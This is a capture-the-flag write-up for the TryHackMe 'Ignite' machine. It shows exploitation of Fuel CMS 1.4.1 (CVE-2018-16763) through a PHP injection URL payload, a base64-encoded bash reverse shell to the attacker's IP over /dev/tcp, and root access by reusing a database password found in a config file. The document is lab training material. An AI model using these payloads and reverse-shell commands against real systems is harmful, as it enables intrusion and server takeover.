# Ignite

**IP:** 10.10.53.115  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 07/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.53.115 -oA nmap/Ignite
```

| Port | Service | Version |
|------|---------|---------|
| 80 | http | Apache httpd 2.4.18 |

## Enumeration

The HTTP header revealed that the webserver is running `Fuel CMS 1.4`, which I found an RCE exploit for in `searchsploit`.
```bash
searchsploit fuel cms 1.4

...
fuel CMS 1.4.1 - Remote Code Execution (1)                 | linux/webapps/47138.py
...
Shellcodes: No Results
                                                                                searchsploit -m 47138    
  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/wither/CTF/THM/Ignite/files/47138.py
```

## Exploitation

It didn't seem to work, but it was primarily just running system commands like this in the URL (encoded):
```bash
/fuel/pages/select/?filter='+pi(print($a='system'))+$a('whoami')+'
```

It also didn't like spaces, so I base64 encoded a bash reverse shell 
```bash
echo '/bin/bash -i >& /dev/tcp/10.23.121.106/9001 0>&1' | base64                L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIzLjEyMS4xMDYvOTAwMSAwPiYxCg==
                                                                                echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjIzLjEyMS4xMDYvOTAwMSAwPiYxCg== | base64 -d | bash
```

And sent that in Burp Suite
![[Pasted image 20250607163807.png]]

To get a shell as `www-data`.
```bash
rlwrap nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.23.121.106] from (UNKNOWN) [10.10.229.16] 34074
bash: cannot set terminal process group (1043): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$ 
```

## Privilege Escalation

After some research, I found that the database configuration file for `Fuel CMS` was in `/var/www/html/fuel/application/config/database.php` and it contained a password `mememe`.
```bash
cat $(find . -name "database.php" 2>/dev/null) | grep "password"
<ml$ cat $(find . -name "database.php" 2>/dev/null) | grep "password"        
|       ['password'] The password used to connect to the database
        'password' => 'mememe',
```

I had to upgrade my shell to use it, but I tried it against the `root` user and successfuly logged in.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
<ml$ python3 -c 'import pty; pty.spawn("/bin/bash")'                         
www-data@ubuntu:/var/www/html$ su -
su -
Password: mememe

id
uid=0(root) gid=0(root) groups=0(root)
```

User flag was in `/home/www-data/flag.txt`.
```bash
cat /home/www-data/flag.txt
```

`root` flag was in `/root/root.txt`.
```bash
cat /root/root.txt
```

## References
- [fuel CMS 1.4.1 - Remote Code Execution (1) - Linux webapps Exploit](https://www.exploit-db.com/exploits/47138)
- [FUEL-CMS/fuel/application/config/database.php at master · daylightstudio/FUEL-CMS · GitHub](https://github.com/daylightstudio/FUEL-CMS/blob/master/fuel/application/config/database.php)

---
#nmap #searchsploit #fuel-cms #rce #burp #base64-bypass #password-reuse #cve-2018-16763 #shell-upgrade #linux-privesc #thm